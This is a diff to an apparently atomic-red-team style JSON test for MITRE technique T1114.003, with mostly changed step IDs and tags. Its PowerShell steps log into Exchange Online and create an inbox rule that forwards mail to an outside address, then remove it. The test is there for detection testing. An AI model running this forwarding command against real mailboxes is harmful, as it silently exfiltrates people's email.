@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "4154edd5-81fa-4fe9-93ed-a17fafacc12d",
+      "id": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
       "type": "execute-command",
       "data": {
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "1a56b317-56e2-4e11-8bfa-49580a71b6e1",
+      "id": "ecddfd45-026b-485a-886f-75f6b8e1a92d",
       "type": "execute-command",
       "data": {
         "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "b5021086-cc1a-40f6-a420-8f4a70a78785",
+      "id": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
       "name": "Check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "e23b90d7-1c37-4bba-a0c2-115745c09eb8",
+      "id": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6",
       "name": "Resolve dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "ba0a9649-62af-486c-8336-2d02243bcab7",
+      "id": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc",
       "name": "Re-check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
@@ -60,41 +60,47 @@
   ],
   "flows": [
     {
-      "s": "4154edd5-81fa-4fe9-93ed-a17fafacc12d",
+      "s": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
       "p": "on-success",
-      "o": "1a56b317-56e2-4e11-8bfa-49580a71b6e1"
+      "o": "ecddfd45-026b-485a-886f-75f6b8e1a92d"
     },
     {
-      "s": "4154edd5-81fa-4fe9-93ed-a17fafacc12d",
+      "s": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
       "p": "on-failure",
-      "o": "1a56b317-56e2-4e11-8bfa-49580a71b6e1"
+      "o": "ecddfd45-026b-485a-886f-75f6b8e1a92d"
     },
     {
-      "s": "b5021086-cc1a-40f6-a420-8f4a70a78785",
+      "s": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
       "p": "on-success",
-      "o": "4154edd5-81fa-4fe9-93ed-a17fafacc12d"
+      "o": "22850ebe-07fc-417a-92ed-b1ba35af3aa3"
     },
     {
-      "s": "b5021086-cc1a-40f6-a420-8f4a70a78785",
+      "s": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
       "p": "on-failure",
-      "o": "e23b90d7-1c37-4bba-a0c2-115745c09eb8"
+      "o": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6"
     },
     {
-      "s": "e23b90d7-1c37-4bba-a0c2-115745c09eb8",
+      "s": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6",
       "p": "on-success",
-      "o": "ba0a9649-62af-486c-8336-2d02243bcab7"
+      "o": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc"
     },
     {
-      "s": "ba0a9649-62af-486c-8336-2d02243bcab7",
+      "s": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc",
       "p": "on-failure",
-      "o": "4154edd5-81fa-4fe9-93ed-a17fafacc12d"
+      "o": "22850ebe-07fc-417a-92ed-b1ba35af3aa3"
     }
   ],
   "tags": [
-    "T1114.003",
-    "atomic-red-team"
+    "T1114",
+    "T1114.003"
   ],
   "input_arguments": [
+    {
+      "name": "username",
+      "type": "string",
+      "description": "office-365 username",
+      "value": ""
+    },
     {
       "name": "password",
       "type": "string",
@@ -112,12 +118,6 @@
       "type": "string",
       "description": "destination email addresses",
       "value": "Atomic_Operator@fakeemail.aq"
-    },
-    {
-      "name": "username",
-      "type": "string",
-      "description": "office-365 username",
-      "value": ""
     }
   ]
 }
